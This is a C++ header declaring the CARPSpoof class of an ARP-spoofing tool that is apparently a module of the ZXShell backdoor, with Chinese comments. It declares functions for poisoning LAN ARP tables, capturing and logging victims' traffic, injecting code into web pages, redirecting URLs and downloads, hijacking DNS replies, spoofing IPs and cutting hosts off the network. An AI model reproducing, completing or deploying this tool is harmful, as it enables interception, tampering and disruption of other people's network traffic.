// ARPSpoof.h: interface for the CARPSpoof class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_ARPSPOOF_H__2E744A36_0776_4A20_93DC_18511D67CB50__INCLUDED_)
#define AFX_ARPSPOOF_H__2E744A36_0776_4A20_93DC_18511D67CB50__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#define _WSPIAPI_COUNTOF

#include <pcap.h>
#include <windows.h>
#include <stdio.h>
#include <tchar.h>
#include <iphlpapi.h>
#include <time.h>

#include <list>
#include "protoinfo.h"
#include "speedctrl.cpp"

#if defined _ZXSHELL
	#include "..\common.h"
	#include "..\..\zxsCommon\zxsWinAPI.h"
#endif

#pragma comment(lib, "Iphlpapi.lib")
//#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define IP4LEN 16
#define MACLEN 6

#define SPOOF_A 1
#define SPOOF_B 2

////////////////////////////////////////////pcap api
//pcap 的函数调用类型是__cdecl的，编译器要设置为__cdecl(默认)

typedef void	_ZXpcap_perror(pcap_t *, char *);
typedef int	_ZXpcap_sendpacket(pcap_t *, const u_char *, int);
typedef int 	_ZXpcap_next_ex(pcap_t *, struct pcap_pkthdr **, const u_char **);
typedef void	_ZXpcap_freealldevs(pcap_if_t *);
typedef void	_ZXpcap_close(pcap_t *);
typedef void	_ZXpcap_breakloop(pcap_t *);
typedef pcap_t	*_ZXpcap_open_live(const char *, int, int, int, char *);
typedef int	_ZXpcap_findalldevs(pcap_if_t **, char *);
typedef int _ZXpcap_dispatch  (  pcap_t *  p,  
  int  cnt,  
  pcap_handler  callback,  
  u_char *  user 
 );

typedef int _ZXpcap_loop  (  pcap_t *  p,  
  int  cnt,  
  pcap_handler  callback,  
  u_char *  user 
 )  ;


namespace PCAPAPI
{

extern bool Inited;
BOOL Init_pcapAPI();

extern _ZXpcap_perror        *pcap_perror;
extern _ZXpcap_sendpacket    *pcap_sendpacket;
extern _ZXpcap_next_ex       *pcap_next_ex;
extern _ZXpcap_freealldevs   *pcap_freealldevs;
extern _ZXpcap_close         *pcap_close;
extern _ZXpcap_breakloop     *pcap_breakloop;
extern _ZXpcap_open_live     *pcap_open_live;
extern _ZXpcap_findalldevs   *pcap_findalldevs;
extern _ZXpcap_dispatch      *pcap_dispatch;
extern _ZXpcap_loop          *pcap_loop;

}

#pragma pack(push, 1)//取消内存大小自动对齐

struct _MAC
{
	BYTE mac[6];
};

struct _HOSTINFO
{
	bool bLiving;
	DWORD dwIP;
	_MAC s_mac;
	char szIP[16];
	char netbios[16];
};

struct _SCANHOST
{
	bool b;
	long *pCount;
	_HOSTINFO *pHostInfo;
};

struct _POSTFIX
{
	char name[15];
};

struct _LOGFILTER
{
	int flag;
	char *keyword;
	_LOGFILTER *next;
};

struct _HACKSITE
{
	DWORD dwIP;
	char szIP[16];
};

struct _HACKDNS
{
	char szDN[128];
	DWORD dwIP;
};

struct _SPOOFIP
{
	DWORD realIP;
	DWORD fakeIP;
};

BOOL GetdwIP(char *startip, char *endip, DWORD *IP_start, DWORD *IP_end);

USHORT checksum(USHORT *buffer, int size);
unsigned long cksum1(unsigned long cksum, USHORT *buffer, int size);
USHORT cksum2(unsigned long cksum);
void _Checksum(IPHeader *pIphdr);


class CARPSpoof  
{
public:
	_HOSTINFO m_Gateway;
	_HOSTINFO m_Me;
	int m_spoofdelay_ms;

	//一些链表
	list<_HOSTINFO> m_host_List;
	list<WORD> m_port_List;
	list<_POSTFIX> m_postfixname_List;
	list<_LOGFILTER*> m_logfilter_List;
	list<_HACKSITE> m_hacksite_List;
	list<_HACKDNS> m_hackdns_List;
	list<_SPOOFIP> m_spoofip_List;

	pcap_t * m_adhandle; // 网卡句柄

	HANDLE hSpoofThread;
	HANDLE hCaptureThread;
	bool ThreadFlag;

	char cmdline[4196];

	bool bGetNetbiosName;
	DWORD m_spoofMode;

	//保存捕捉到的数据到文件的一些变量
	int packetcount;
	bool b_SaveToFile;
	bool savemode;
	char m_SaveToFile[MAX_PATH];
	FILE *m_fp;

	//修改网页代码的变量
	bool bHackHtml;
	char m_InsertCode[1024];
	bool bHackURL;
	char m_NewURL[MAX_PATH];
	char m_NewFile[MAX_PATH];

	//限制其他机的网络带宽,单位:KB
	DWORD m_bandwidth;
	double m_TotalData;
	SPEEDSCTRL sc;

	//打印标志，默认0，内部的处理信息不打印
	int printfFlag;

	DWORD m_rescan_Interval;

	//arp欺骗后恢复
	//恢复时间间隔，默认为0，即恢复一次，否则按时间间隔不停恢复
	DWORD m_restore_Interval;

	//利用arp欺骗切断网络
	//默认为0，即切断一次，否则按时间间隔不停欺骗实现切断
	DWORD m_cut_Interval;

	int m_cut_Mode;
	list<char*> m_cutmac_List;

	//
	bool bHackDNS;

	//
	bool bSpoofIP;

	int runFlag;
	int exitFlag;
	//zxshell client socket
	SOCKET Socket;
public:
	CARPSpoof();
	virtual ~CARPSpoof();
	void init();
	void destroy();

public:

	int zxarps_printf(const char *fmt, ...);
	int GetStatus(){ return runFlag;};
	int SaveCmdline(char *line)
	{
		return _snprintf(cmdline, sizeof(cmdline)-1, line);
	}

	int GetAdapterList();
	bool GetAdapterByName(char szAdapterName[], char szIPAddr[], 
		unsigned char ucPhysicalAddr[],  char szGateIPAddr[]);
	bool OpenAdapterByIndex(int idx);
	static bool GetMacByIP(char *szIP, unsigned char *mac);
	static bool GetMacByIP(DWORD dwIP, unsigned char *mac);
	static bool IsHostAlive(char *szIP);
	static bool IsHostAlive(DWORD dwIP);
	bool IsPortInList(WORD wPort);
	bool IsPostfixInList(char *pf);

	bool StaticARP(char szIPAddr[], BYTE bPhysAddr[]);
	int MakeIPAndPortList(char *strIP, char *strPort);

	static DWORD WINAPI GetMacThread(LPVOID lParam);
	int GetHostInfo();
	int GetAliveHostList();
	void EnableGetNetbiosName();
	void SetRescanInterval(DWORD t){ m_rescan_Interval = t;};

	void SetBandWidth(DWORD kb){ m_bandwidth = kb*1024;}
	void DoSpeedsCtrl(int len);

	bool bSaveData(){ return b_SaveToFile;}
	void EnableSaveData(bool mode){ b_SaveToFile = true; savemode = mode;};
	bool SetLogFileName(char *FileName);
	BOOL LogData(TCPHeader *th, IPHeader *ih, BYTE *pszData, int bytes);
	BOOL LogFilter(char *tcp_data, unsigned int tcp_len);
	void SetFilter(char *str);
	void ClearFilter();

	bool HackURL(CARPSpoof *lpObj, u_char *tcp_data, unsigned int tcp_len, int *newlen);
	int AddRule_PostFix(char *strPostfix);
	void SetPostfixURLFileName(char *szName);
	void EnableHackURL(bool b){ bHackURL = b;}
	bool bHackURLEnabled(){ return bHackURL;}
	void SetSpoolURL(char *szURL);
	
	bool HackHtml(CARPSpoof *lpObj, u_char *tcp_data, unsigned int tcp_len, int *newlen);
	void InsertHtmlCode(char *szCode){ strcpy(m_InsertCode, szCode);}
	void EnableHackHtml(bool b){ bHackHtml = b;}
	bool bHackHtmlEnabled(){ return bHackHtml;}
	int SetHackSite(char *strIP);
	bool bHackSiteByIP(DWORD dwIP);

	bool HackDNS(CARPSpoof *lpObj, ETHeader *eh, IPHeader *ih, UDPHEADER *uh, u_char *udp_data, unsigned int udp_len, int *newlen);
	void EnableHackDNS(bool b){ bHackDNS = b;}
	bool bHackDNSEnabled(){ return bHackDNS;}
	int SetHackDomainName(char *strDN);
	bool bHackDomainName(char *strDN, DWORD *lpdwIP);

	void EnableSpoofIP(bool b){ bSpoofIP = b;}
	bool bSpoofIPEnabled(){ return bSpoofIP;}
	int SetSpoofIP(char *strIP);
	bool bIPToSpoof(DWORD srcIP, DWORD *lpfakeIP);
	bool bSpoofIP_FixDestIP(DWORD fakeIP, DWORD *lprealIP);
	bool DoSpoofingIP(IPHeader *ih);

	void wait();
	void StartCapture();
	void StopCapture();
	void SetInterval(int ms);
	void SetSpoofMode(DWORD mode);
	bool SetSpoofHost(char *szIP);
	DWORD GetSpoofMode(){ return m_spoofMode; };
	void KillSpoofThread();
	static void AnalyzePacket(CARPSpoof *lpObj, const struct pcap_pkthdr *header, u_char *pkt_data);
	static bool ProcessPacket(CARPSpoof *lpObj, const struct pcap_pkthdr *header, u_char **pkt_data, unsigned int *pkt_len);
	BYTE *dwIP2MAC(DWORD dwIP);
	static DWORD WINAPI DoSpoof(LPVOID lParam);
	static DWORD WINAPI DoCapture(LPVOID lParam);
	static DWORD WINAPI RescanThread(LPVOID lParam);
	BOOL StartupRescanThread();

	static void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
	void RestoreARPTable();
	void SetRestoreInterval(DWORD t){ m_restore_Interval = t;}

	void LANCutter();
	void SetCutInterval(DWORD t){ m_cut_Interval = t;}
	void SetCutMode(int t){ m_cut_Mode = t;}
	int AddRuleToCut(char *strMAC);
	bool IsBlackMAC(BYTE *pmac);

};



#pragma pack(pop)


#endif // !defined(AFX_ARPSPOOF_H__2E744A36_0776_4A20_93DC_18511D67CB50__INCLUDED_)
